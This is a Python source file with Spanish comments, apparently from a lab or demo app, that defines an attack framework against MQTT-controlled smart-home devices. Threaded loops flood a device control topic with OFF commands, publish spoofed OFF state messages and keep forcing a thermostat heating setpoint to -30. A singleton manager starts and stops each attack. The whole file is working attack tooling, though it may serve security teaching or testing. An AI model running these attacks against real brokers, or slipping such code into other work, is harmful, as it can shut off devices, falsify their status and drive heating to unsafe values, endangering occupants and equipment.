import threading
import time
from abc import ABC, abstractmethod
from typing import Dict, Any, Tuple

from config import ATTACK2_INTERVAL, MQTT_SET_TOPIC, MQTT_STATE_TOPIC, ATTACK3_INTERVAL, ATTACK4_INTERVAL, MQTT_SET_TEMP_TOPIC
from mqtt_service import publish_to_topic
from utils import add_event


class BaseAttack(ABC):
    """Clase base para todos los ataques."""
    
    def __init__(self, attack_id: str, name: str, interval: float):
        self.attack_id = attack_id
        self.name = name
        self.interval = interval
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
    
    @abstractmethod
    def execute_attack(self) -> Tuple[bool, str, bool]:
        """Ejecuta una iteración del ataque. Retorna (ok, msg, denied)."""
        pass
    
    def worker(self) -> None:
        """Worker thread que ejecuta el ataque."""
        add_event('warn', f'🚨 {self.name} INICIADO')
        
        try:
            while self.running:
                ok, msg, denied = self.execute_attack()
                if not ok and denied:
                    add_event('warn', f'{self.name} bloqueado por permisos MQTT')
                    break
                time.sleep(self.interval)
        except Exception as exc:
            add_event('error', f'{self.name} error: {exc}')
        finally:
            self.running = False
            self.thread = None
            add_event('info', f'🛑 {self.name} DETENIDO')
    
    def start(self) -> Tuple[bool, str]:
        """Inicia el ataque."""
        with self.lock:
            if self.running and self.thread is not None and self.thread.is_alive():
                return False, f'{self.name} ya activo'
            
            self.running = True
            self.thread = threading.Thread(
                target=self.worker, 
                daemon=True, 
                name=f'{self.attack_id}-worker'
            )
            self.thread.start()
            return True, f'{self.name} ACTIVADO 💥'
    
    def stop(self) -> str:
        """Detiene el ataque."""
        self.running = False
        return f'{self.name} DESACTIVADO 🛑'
    
    def is_running(self) -> bool:
        """Verifica si el ataque está activo."""
        return self.running and self.thread is not None and self.thread.is_alive()


class Attack2(BaseAttack):
    """Ataque 2: Spam de comandos OFF al topic de control."""
    
    def __init__(self):
        super().__init__('attack2', 'ATAQUE 2', ATTACK2_INTERVAL)
    
    def execute_attack(self) -> Tuple[bool, str, bool]:
        return publish_to_topic(MQTT_SET_TOPIC, {'state': 'OFF'})


class Attack3(BaseAttack):
    """Ataque 3: Spam de mensajes falsos al topic de estado."""
    
    def __init__(self):
        super().__init__('attack3', 'ATAQUE 3', ATTACK3_INTERVAL)
    
    def execute_attack(self) -> Tuple[bool, str, bool]:
        return publish_to_topic(MQTT_STATE_TOPIC, {'state': 'OFF'})


class Attack4(BaseAttack):
    """Ataque 4: Fuerza temperatura a -30 constantemente en el topic de temperatura."""

    def __init__(self):
        super().__init__('attack4', 'ATAQUE 4 (TEMP -30)', ATTACK4_INTERVAL)

    def execute_attack(self) -> Tuple[bool, str, bool]:
        return publish_to_topic(MQTT_SET_TEMP_TOPIC, {'current_heating_setpoint': -30})


class AttackManager:
    """Gestor centralizado de todos los ataques."""
    
    _instance = None
    _attacks: Dict[str, BaseAttack] = {}
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialize_attacks()
        return cls._instance
    
    def _initialize_attacks(self):
        """Inicializa todos los ataques disponibles."""
        self._attacks = {
            'attack2': Attack2(),
            'attack3': Attack3(),
            'attack4': Attack4(),
        }
    
    def register_attack(self, attack: BaseAttack):
        """Registra un nuevo ataque dinámicamente."""
        self._attacks[attack.attack_id] = attack
    
    def start_attack(self, attack_id: str) -> Tuple[bool, str]:
        """Inicia un ataque específico."""
        if attack_id not in self._attacks:
            return False, f'Ataque {attack_id} no encontrado'
        
        return self._attacks[attack_id].start()
    
    def stop_attack(self, attack_id: str) -> str:
        """Detiene un ataque específico."""
        if attack_id not in self._attacks:
            return f'Ataque {attack_id} no encontrado'
        
        return self._attacks[attack_id].stop()
    
    def get_attack_state(self, attack_id: str) -> bool:
        """Obtiene el estado de un ataque específico."""
        if attack_id not in self._attacks:
            return False
        
        return self._attacks[attack_id].is_running()
    
    def get_all_attack_states(self) -> Dict[str, bool]:
        """Obtiene el estado de todos los ataques."""
        return {
            attack_id: attack.is_running() 
            for attack_id, attack in self._attacks.items()
        }
    
    def get_available_attacks(self) -> Dict[str, str]:
        """Obtiene la lista de ataques disponibles."""
        return {
            attack_id: attack.name 
            for attack_id, attack in self._attacks.items()
        }


# Instancia global del gestor
attack_manager = AttackManager()

# Funciones de compatibilidad para el código existente
def start_attack2() -> tuple[bool, str]:
    """Función de compatibilidad - usa el nuevo sistema."""
    return attack_manager.start_attack('attack2')

def stop_attack2() -> str:
    """Función de compatibilidad - usa el nuevo sistema."""
    return attack_manager.stop_attack('attack2')

def start_attack3() -> tuple[bool, str]:
    """Función de compatibilidad - usa el nuevo sistema."""
    return attack_manager.start_attack('attack3')

def stop_attack3() -> str:
    """Función de compatibilidad - usa el nuevo sistema."""
    return attack_manager.stop_attack('attack3')